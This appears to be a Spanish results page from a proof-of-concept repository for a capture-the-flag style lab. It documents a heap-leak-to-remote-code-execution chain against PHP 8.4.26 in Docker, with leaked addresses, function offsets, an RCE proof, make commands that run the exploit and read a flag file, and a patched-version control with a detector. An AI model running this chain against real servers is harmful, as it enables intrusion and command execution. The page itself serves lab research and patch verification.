# Resultados de la ejecución

Todos los datos de esta página se obtuvieron contra el laboratorio local, en
loopback, con la flag sintética. No se usó ningún sistema de terceros.

## Entorno

| Elemento | Valor |
| --- | --- |
| Host | macOS arm64 |
| Python | 3.9.6 |
| Docker | 29.8.1 |
| Plataforma de las imágenes | `linux/amd64` (emulación) |
| Imagen vulnerable | `php:8.4.26-apache` |
| Digest vulnerable | `sha256:60111400ff77…` |
| Imagen parcheada | `php:8.4.27-apache` |
| Digest parcheada | `sha256:be1326658a7d…` |
| Apache | 2.4.69 (Debian) |
| `memory_limit` | `8M` |
| Worker | prefork, `MaxRequestWorkers=1` |

## Resumen

| Target | PHP | Banner | Cookie etapa 1 | Leak | RCE | Proof |
| --- | --- | --- | --- | --- | --- | --- |
| `127.0.0.1:8088` | 8.4.26 | vulnerable | 4096 B | sí | sí | `uid=33(www-data)` |
| `127.0.0.1:8089` | 8.4.27 | patched | 32 B | no | no | — |

Veredicto de la matriz: **`PATCHED_CONTROL_OK`**.

## Leaks

Contra el target vulnerable:

```text
[*] target: http://127.0.0.1:8088/index.php (127.0.0.1:8088 [loopback])
[*] profile: bookworm php=8.4.26 zif=0x465370 dtor=0x65eb60 htdata=0x690d8 ...
[*] offsets source: php2shell-vuln (offsets-php2shell-vuln.env; sha256 51663cf883b1)
[*] rotating worker over HTTP
[*] stage 1: heap leak (attempt 1/3)
[+] chunk base = 0x7ffffc400000
[*] rotating worker over HTTP
[*] stage 2: libphp leak (attempt 1/3)
[+] libphp base = 0x7ffffe013000
CHUNK_BASE=0x7ffffc400000
LIBPHP_BASE=0x7ffffe013000
STAGE1_COOKIE_BYTES=4096
STAGE2_COOKIE_BYTES=16
HTDATA=0x7ffffc4690d8
ZIF=0x7ffffe478370
```

Los valores de ASLR cambian en cada ejecución; la forma del leak y las
longitudes de cookie no.

## RCE

```text
[*] stage 3: HTDATA=0x7ffffc4690d8 ZIF=0x7ffffe478370
[+] RCE on stage 3 attempt 1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

El proof se escribe en `runtime/out/p1`, que es `/out/p1` dentro del
contenedor.

## Flag sintética

Con el comando de 14 bytes:

```sh
make exploit CMD='cat /f>/out/p1'
```

```text
PROOF: FLAG{php2shell_lab_synthetic_flag_redacted}
```

La flag real del reto de THM se omite deliberadamente. `/f` está montado desde
`runtime/f`; el contenido es sintético y está ignorado por git.

## Control parcheado

```text
[patched] [*] profile: bookworm php=8.4.26 zif=0x46ad70 dtor=0x66a620 ...
[patched] [*] stage 1: heap leak (attempt 1/3)
[patched] [-] heap leak missed
...
[-] patched: BLOCKED at stage0 after 3 attempts (4.4s): HEAP_LEAK_FAILED
[=] verdict: PATCHED_CONTROL_OK
```

La cookie de la etapa 1 mide 32 bytes, no 4096. El leak no se reproduce y la
cadena no llega a la etapa 2.

## Detección

Pasiva:

```text
$ python3 -m poc detect -u http://127.0.0.1:8088/index.php
target:    http://127.0.0.1:8088/index.php
HTTP:      200
server:    Apache/2.4.69 (Debian)
powered:   PHP/8.4.26
version:   8.4.26
verdict:   vulnerable

$ python3 -m poc detect -u http://127.0.0.1:8089/index.php
...
powered:   PHP/8.4.27
version:   8.4.27
verdict:   patched
```

Con probe conductual (etapa 1):

```json
{
  "version": "8.4.26",
  "verdict": "vulnerable",
  "probe": {
    "success": true,
    "stage1_cookie_len": 4096,
    "chunk_base": "0x7ffffc400000"
  }
}
```

```json
{
  "version": "8.4.27",
  "verdict": "patched",
  "probe": {
    "success": false,
    "stage1_cookie_len": 32,
    "chunk_base": ""
  }
}
```

## JSON de la matriz

`make matrix` escribe `results/matrix-<timestamp>.json`. Extracto del run
`matrix-20261029-152141.json`:

```json
{
  "verdict": "PATCHED_CONTROL_OK",
  "profile_fingerprint": "…",
  "results": [
    {
      "label": "vuln",
      "php_version": "8.4.26",
      "offsets": {
        "zif_system": "0x465370",
        "zval_ptr_dtor": "0x65eb60",
        "htdata": "0x690d8"
      },
      "result": {
        "success": true,
        "stage": "rce",
        "chunk_base": "0x7ffffc400000",
        "libphp_base": "0x7ffffe013000",
        "htdata": "0x7ffffc4690d8",
        "zif": "0x7ffffe478370",
        "stage1_cookie_len": 4096,
        "stage2_cookie_len": 16,
        "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
        "elapsed": 7.332
      }
    },
    {
      "label": "patched",
      "php_version": "8.4.27",
      "offsets": {
        "zif_system": "0x46ad70",
        "zval_ptr_dtor": "0x66a620",
        "htdata": "0x690d8"
      },
      "result": {
        "success": false,
        "error": "HEAP_LEAK_FAILED",
        "stage1_cookie_len": 32,
        "elapsed": 4.368
      }
    }
  ]
}
```

## Lectura de los resultados

1. **La cadena completa funciona en 8.4.26** con la configuración del reto, en
   una ejecución limpia y en el primer intento de cada etapa.
2. **El parche cambia el comportamiento en la primera etapa**: la cookie pasa
   de 4096 a 32 bytes. El leak de heap desaparece.
3. **No se puede atribuir el fallo del control a offsets incorrectos**: el
   runner extrae `zif_system` y `zval_ptr_dtor` del propio `libphp.so` de
   8.4.27 (`0x46ad70`, `0x66a620`) y los usa en el payload.
4. **El control demuestra que el primitivo de leak está bloqueado**, no
   necesariamente que la etapa 3 esté bloqueada de forma independiente. Para
   demostrar eso habría que recalibrar el grooming de 8.4.27 y llegar a la
   etapa 3 con un leak válido; el parche lo impide en la práctica.

## Limitaciones

- La emulación `linux/amd64` en Apple Silicon puede alterar tiempos y
  direcciones, pero no la lógica de la cadena.
- Las constantes de grooming son específicas de la build 8.4.26. Otra imagen
  (por ejemplo, Alpine) requiere recalibrar.
- El comando está limitado a 14 bytes por el carrier de 167 bytes.
- El laboratorio usa una flag sintética; no reproduce la flag del reto.
- `display_errors=On` y `memory_limit=8M` son parte del entorno del reto. En
  una configuración de producción con `display_errors=Off` y un límite mayor,
  la cadena de referencia no aplica tal cual.

## Reproducción

```sh
make lab-up-patched
make doctor
make leak
make exploit
make exploit CMD='cat /f>/out/p1'
make detect
python3 -m poc detect --probe -u http://127.0.0.1:8088/index.php
make matrix
```

Cada ejecución genera direcciones nuevas. Lo esperado es:

- `vuln`: `SUCCESS` con `stage=rce`;
- `patched`: `BLOCKED` con `stage1_cookie_len=32`;
- veredicto `PATCHED_CONTROL_OK`.
